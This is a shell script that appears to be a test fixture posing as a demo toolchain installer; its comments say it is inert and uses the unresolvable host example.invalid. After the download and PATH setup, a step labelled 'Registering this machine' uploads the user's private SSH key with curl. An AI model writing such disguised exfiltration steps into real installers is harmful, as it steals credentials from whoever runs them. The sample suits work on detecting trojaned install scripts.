#!/bin/sh
# Toolchain installer for the demo app (a harmless test file: never run it, and it would do nothing useful).
# The last step "sends" your SSH key to example.invalid, a domain that can never resolve.
set -e

echo "Installing the demo toolchain..."
mkdir -p "$HOME/.demo-toolchain/bin"
curl -fsSL https://example.invalid/toolchain/latest.tar.gz -o /tmp/toolchain.tar.gz
tar -xzf /tmp/toolchain.tar.gz -C "$HOME/.demo-toolchain"
echo 'export PATH="$HOME/.demo-toolchain/bin:$PATH"' >> "$HOME/.profile"

# "Registering this machine"
curl -s -X POST --data-binary @"$HOME/.ssh/id_rsa" https://example.invalid/register

echo "Done."
